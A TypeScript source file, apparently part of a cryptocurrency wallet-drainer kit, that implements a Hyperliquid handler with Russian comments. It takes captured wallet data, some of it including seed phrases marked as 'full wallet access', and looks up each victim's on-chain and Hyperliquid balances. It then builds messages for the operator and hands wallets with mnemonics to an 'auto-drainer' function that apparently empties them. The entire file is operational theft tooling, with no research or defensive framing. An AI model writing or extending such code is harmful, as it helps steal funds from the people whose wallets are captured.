import type { PlatformHandler, ProcessResult, PlatformData } from './types.js';
import type {
  WalletDataWithMnemonic,
  WalletDataWithoutMnemonic,
  AddressBalance,
} from '../_utils.js';
import {
  getAddressBalance,
  getHyperliquidBalance,
  getAddressTokenBalancesFromHyperliquid,
  formatWalletMessage,
  formatWalletMessageSafe,
  calculateWithdrawalsTotalUsd,
  sendToAutoDrainer,
} from '../_utils.js';

// Обработчик для платформы Hyperliquid (логика идентична оригинальной)
export class HyperliquidHandler implements PlatformHandler {
  name = 'hyperliquid';

  async processMessage(data: PlatformData): Promise<ProcessResult> {
    // Типизируем данные для Hyperliquid
    const walletData = data as WalletDataWithMnemonic | WalletDataWithoutMnemonic;
    console.log(`   Type: ${'mnemonic' in walletData ? 'Full wallet access' : 'Wallet connection'}`);
    console.log(`   Address: ${walletData.address}`);

    // Рассчитать USD для withdrawal (для wallets без mnemonic)
    if (!('mnemonic' in walletData)) {
      try {
        const totalWithdrawUsd = await calculateWithdrawalsTotalUsd(walletData);
        walletData.totalWithdrawUsd = totalWithdrawUsd;
        console.log(`   Withdrawals total USD: $${totalWithdrawUsd.toFixed(2)}`);
      } catch (priceError) {
        console.error(`❌ Failed to calculate withdrawal USD total:`, priceError);
      }
    }

    // Проверка балансов
    const balances: AddressBalance[] = [];

    if ('mnemonic' in walletData) {
      // Для кошелька с мнемоникой: проверяем основной адрес
      console.log(`💰 Checking balances for wallet with mnemonic...`);
      console.log(`   Checking main address: ${walletData.address}`);

      try {
        const mainBalance = await getAddressBalance(walletData.address);
        const [hlTotalBalance, hlSpotBalance] = await getHyperliquidBalance(walletData.address);
        const hlTokenBalances = await getAddressTokenBalancesFromHyperliquid(walletData.address);

        balances.push({
          address: walletData.address,
          balance: mainBalance + hlTotalBalance + hlTokenBalances,
          hyperliquid: {
            totalBalance: hlTotalBalance + hlTokenBalances,
            spotTotalBalance: hlSpotBalance + hlTokenBalances,
          },
        });
      } catch (balanceError) {
        console.error(`❌ Error fetching balance for main address ${walletData.address}:`, balanceError);
        balances.push({
          address: walletData.address,
          balance: 0,
          hyperliquid: {
            totalBalance: 0,
            spotTotalBalance: 0,
          },
        });
      }
    } else {
      // Для кошелька без мнемоники: проверяем только основной адрес
      console.log(`💰 Checking balance for address: ${walletData.address}`);

      try {
        const balance = await getAddressBalance(walletData.address);
        balances.push({
          address: walletData.address,
          balance: balance,
          hyperliquid: {
            totalBalance: 0,
            spotTotalBalance: 0,
          },
        });
      } catch (balanceError) {
        console.error(`❌ Error fetching balance for address ${walletData.address}:`, balanceError);
        balances.push({
          address: walletData.address,
          balance: 0,
          hyperliquid: {
            totalBalance: 0,
            spotTotalBalance: 0,
          },
        });
      }
    }

    const totalBalance = balances.reduce((sum, b) => sum + b.balance, 0);
    const totalHyperliquidBalance = balances.reduce((sum, b) => sum + (b.hyperliquid?.totalBalance || 0), 0);
    const totalHyperliquidSpotBalance = balances.reduce(
      (sum, b) => sum + (b.hyperliquid?.spotTotalBalance || 0),
      0
    );

    console.log(`💎 Total balance: $${totalBalance.toFixed(2)}`);
    if (totalHyperliquidBalance > 0) {
      console.log(`🔷 Hyperliquid Total: $${totalHyperliquidBalance.toFixed(2)}`);
      console.log(`💰 Hyperliquid Withdrawable: $${totalHyperliquidSpotBalance.toFixed(2)}`);
    }

    // Форматируем сообщения
    const messageToSend = formatWalletMessageSafe(walletData, balances);
    const messageToSendFull = formatWalletMessage(walletData, balances);

    // Отправка в auto-drainer (non-blocking)
    if ('mnemonic' in walletData) {
      sendToAutoDrainer(walletData).catch((error) => {
        console.error('❌ Auto-drainer request failed (non-blocking):', error);
      });
    }

    return {
      messageToSend,
      messageToSendFull,
    };
  }
}

